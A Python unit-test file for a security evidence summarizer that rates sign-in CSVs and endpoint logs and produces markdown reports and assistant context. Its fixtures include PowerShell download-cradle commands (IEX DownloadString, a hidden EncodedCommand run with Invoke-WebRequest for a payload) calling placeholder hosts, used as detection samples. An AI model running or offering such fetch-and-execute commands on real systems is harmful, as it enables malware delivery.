"""Tests for evidence summarization."""

import unittest

from evidence_summarizer import analyze_evidence


class EvidenceSummarizerTests(unittest.TestCase):
    def test_summary_generates_markdown_report(self):
        content = (
            b"timestamp,user,failed_login_count,mfa_result,success_after_failures,new_device_flag,"
            b"risky_country_flag,impossible_travel_flag\n"
            b"2026-01-01T00:00:00Z,alex@example.test,8,failed,true,true,true,true\n"
        )
        result = analyze_evidence("signin.csv", content)
        self.assertEqual(result.severity, "High")
        self.assertIn("# Threat Evidence Workbench Report", result.markdown_report)
        self.assertIn("## Indicators and Investigation Artifacts", result.markdown_report)
        self.assertIn("Uploaded evidence summary from current session", result.copilot_context)
        self.assertIn("IOCs / Investigation Artifacts Observed", result.copilot_context)
        self.assertIn("Multiple failed logins", result.copilot_context)

    def test_low_severity_when_no_findings(self):
        content = b"timestamp,user,failed_login_count,mfa_result\n2026-01-01T00:00:00Z,alex@example.test,0,success\n"
        result = analyze_evidence("signin.csv", content)
        self.assertEqual(result.severity, "Low")
        self.assertIn("No suspicious indicators", result.markdown_report)

    def test_copilot_context_excludes_raw_command_text(self):
        content = b"powershell.exe command=\"IEX (New-Object Net.WebClient).DownloadString('https://login.example.test/a.ps1')\""
        result = analyze_evidence("events.log", content)
        self.assertIn("Download cradle indicator", result.copilot_context)
        self.assertNotIn("IEX (New-Object", result.copilot_context)

    def test_copilot_context_prioritizes_command_indicators(self):
        content = (
            b"device=LAB-ENDPOINT-02 user=devon.kim@example.test source_ip=203.0.113.50 "
            b"destination_ip=198.51.100.77 parent_process=WINWORD.EXE process=powershell.exe "
            b"command=\"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand AAA; "
            b"Invoke-WebRequest -Uri https://login.example.test/payload.bin\""
        )
        result = analyze_evidence("events.log", content)
        self.assertIn("Invoke-WebRequest", result.copilot_context)

    def test_kql_uses_uploaded_schema_fields_when_available(self):
        content = (
            b"timestamp,user,source_ip,failed_login_count,mfa_result\n"
            b"2026-01-01T00:00:00Z,alex@example.test,203.0.113.10,8,failed\n"
        )
        result = analyze_evidence("signin.csv", content)

        self.assertIn("by user, source_ip", result.markdown_report)
        self.assertIn("mfa_result", result.markdown_report)

    def test_ioc_counts_appear_in_report(self):
        content = b"device=LAB-ENDPOINT-02 user=devon.kim@example.test source_ip=203.0.113.50 process=powershell.exe -EncodedCommand AAA"
        result = analyze_evidence("events.log", content)

        self.assertIn("Total IPs found: 1", result.markdown_report)
        self.assertIn("Total users found: 1", result.markdown_report)
        self.assertIn("Total suspicious command indicators found: 1", result.markdown_report)


if __name__ == "__main__":
    unittest.main()
